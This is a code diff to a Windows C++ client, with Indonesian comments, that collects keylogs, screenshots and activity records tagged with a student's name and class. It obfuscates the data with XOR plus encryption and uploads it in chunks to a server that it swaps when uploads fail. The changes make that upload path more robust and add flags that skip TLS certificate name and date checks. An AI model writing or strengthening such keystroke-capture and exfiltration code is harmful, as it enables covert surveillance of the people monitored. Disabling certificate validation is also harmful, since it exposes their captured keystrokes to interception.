@@ -11,7 +11,9 @@
 #include <thread>
 #include <algorithm>
 #include <filesystem>
-#include <mutex> // Tambahan untuk keamanan thread
+#include <mutex>
+
+#pragma comment(lib, "wininet.lib")
 
 // Mutex global khusus untuk melindungi akses ke Config::DYNAMIC_SERVER_URL
 static std::mutex g_urlMtx;
@@ -46,17 +48,19 @@ bool PostDataChunked(const std::vector<BYTE>& chunk, std::string type, std::stri
     url.lpszHostName = host; url.dwHostNameLength = 256;
     url.lpszUrlPath = path; url.dwUrlPathLength = 1024;
 
-    // Menggunakan finalUrl (bisa URL default atau URL khusus heartbeat)
     if (!InternetCrackUrlA(finalUrl.c_str(), 0, 0, &url)) {
         InternetCloseHandle(hInt);
         return false;
     }
 
     INTERNET_PORT port = (url.nScheme == INTERNET_SCHEME_HTTPS) ? 443 : url.nPort;
-    if (port == 0) port = 80;
+    if (port == 0) port = (url.nScheme == INTERNET_SCHEME_HTTPS) ? 443 : 80;
     
-    DWORD httpFlags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
-    if (url.nScheme == INTERNET_SCHEME_HTTPS) httpFlags |= INTERNET_FLAG_SECURE;
+    // Tambahkan flag IGNORE_CERT untuk menangani sertifikat SSL yang tidak valid/self-signed
+    DWORD httpFlags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE;
+    if (url.nScheme == INTERNET_SCHEME_HTTPS) {
+        httpFlags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
+    }
 
     HINTERNET hConn = InternetConnectA(hInt, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConn) { 
@@ -71,21 +75,27 @@ bool PostDataChunked(const std::vector<BYTE>& chunk, std::string type, std::stri
         return false; 
     }
 
-    DWORD timeout = 30000; 
+    // Setting timeout agar tidak menggantung jika koneksi buruk
+    DWORD timeout = 20000; // 20 detik
+    InternetSetOptionA(hReq, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
     InternetSetOptionA(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
     InternetSetOptionA(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+
+    // Bersihkan nama file dari karakter yang mungkin merusak header HTTP
+    std::string safeFname = fname;
+    safeFname.erase(std::remove(safeFname.begin(), safeFname.end(), '\n'), safeFname.end());
+    safeFname.erase(std::remove(safeFname.begin(), safeFname.end(), '\r'), safeFname.end());
 
     std::string headers = "X-API-Key: " + Config::RAW_API_KEY + "\r\n" +
                           "X-Client-Version: " + Config::CLIENT_VERSION + "\r\n" +
                           "X-ID: " + SYSTEM_ID + "\r\n" +
                           "X-User: " + STUDENT_NAME + " [" + STUDENT_CLASS + "]\r\n" +
                           "X-Type: " + type + "\r\n" +
-                          "X-Filename: " + fname + "\r\n" +
+                          "X-Filename: " + safeFname + "\r\n" +
                           "X-File-ID: " + fileID + "\r\n" +
                           "X-Chunk-Num: " + std::to_string(chunkNum) + "\r\n" +
                           "X-Chunk-Total: " + std::to_string(chunkTotal) + "\r\n" +
-                          "Content-Type: application/octet-stream\r\n" +
-                          "Content-Length: " + std::to_string(chunk.size()) + "\r\n";
+                          "Content-Type: application/octet-stream\r\n";
 
     BOOL res = HttpSendRequestA(hReq, headers.c_str(), (DWORD)headers.length(), 
                                 (LPVOID)chunk.data(), (DWORD)chunk.size());
@@ -95,7 +105,8 @@ bool PostDataChunked(const std::vector<BYTE>& chunk, std::string type, std::stri
     HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwSize, NULL);
 
     #ifdef _DEBUG
-    std::cout << "[SEND] URL: " << finalUrl << " | Status: " << dwStatusCode << std::endl;
+    if (!res) std::cerr << "[ERROR] HttpSendRequest gagal: " << GetLastError() << std::endl;
+    else std::cout << "[SEND] URL: " << host << path << " | Status: " << dwStatusCode << std::endl;
     #endif
 
     InternetCloseHandle(hReq);
@@ -108,18 +119,32 @@ bool PostDataChunked(const std::vector<BYTE>& chunk, std::string type, std::stri
 void ProcessOfflineQueue() {
     std::vector<std::string> types = {"activity", "keylog", "screenshot"};
     static int failCounter = 0;
+    
+    // Seed random sekali
+    static bool seeded = false;
+    if (!seeded) { srand((unsigned int)time(NULL)); seeded = true; }
 
     for (auto& t : types) {
         std::filesystem::path p = GetCache(t);
         if (!std::filesystem::exists(p)) continue;
 
-        for (auto& entry : std::filesystem::directory_iterator(p)) {
-            std::ifstream f(entry.path(), std::ios::binary);
+        std::error_code ec;
+        for (auto& entry : std::filesystem::directory_iterator(p, ec)) {
+            if (ec) break;
+
+            // Gunakan metode pembacaan file yang lebih efisien untuk file besar
+            std::ifstream f(entry.path(), std::ios::binary | std::ios::ate);
             if (!f.is_open()) continue;
             
-            std::vector<BYTE> buf((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
+            std::streamsize size = f.tellg();
+            if (size <= 0) { f.close(); std::filesystem::remove(entry.path()); continue; }
+            
+            f.seekg(0, std::ios::beg);
+            std::vector<BYTE> buf(static_cast<size_t>(size));
+            if (!f.read(reinterpret_cast<char*>(buf.data()), size)) { f.close(); continue; }
             f.close();
 
+            // Enkripsi sebelum dikirim
             XORData(buf);
             FinalEncryption(buf);
 
@@ -130,27 +155,31 @@ void ProcessOfflineQueue() {
             for (size_t i = 0; i < totalChunks; i++) {
                 size_t start = i * Config::CHUNK_SIZE;
                 size_t length = std::min(Config::CHUNK_SIZE, buf.size() - start);
+                
+                // Akses data langsung tanpa membuat vector baru yang mahal jika memungkinkan
                 std::vector<BYTE> chunk(buf.begin() + start, buf.begin() + start + length);
 
-                // Menggunakan URL default (Config::DYNAMIC_SERVER_URL)
                 if (!PostDataChunked(chunk, t, entry.path().filename().string(), fileID, (int)i, (int)totalChunks)) {
                     failCounter++;
                     if (failCounter >= 3) {
-                        // Kunci mutex saat memperbarui link global
                         std::lock_guard<std::mutex> lock(g_urlMtx);
-                        RefreshDynamicLink();
+                        RefreshDynamicLink(); // Mencoba ganti server jika gagal terus
                         failCounter = 0;
                     }
                     successAll = false;
                     break; 
                 }
                 failCounter = 0;
-                std::this_thread::sleep_for(std::chrono::milliseconds(200));
+                // Jeda pendek antar chunk untuk stabilitas koneksi
+                std::this_thread::sleep_for(std::chrono::milliseconds(150));
             }
 
             if (successAll) {
-                std::error_code ec;
-                std::filesystem::remove(entry.path(), ec);
+                std::error_code removeEc;
+                std::filesystem::remove(entry.path(), removeEc);
+            } else {
+                // Jika satu file gagal, berhenti sejenak sebelum mencoba file berikutnya
+                std::this_thread::sleep_for(std::chrono::seconds(5));
             }
         }
     }
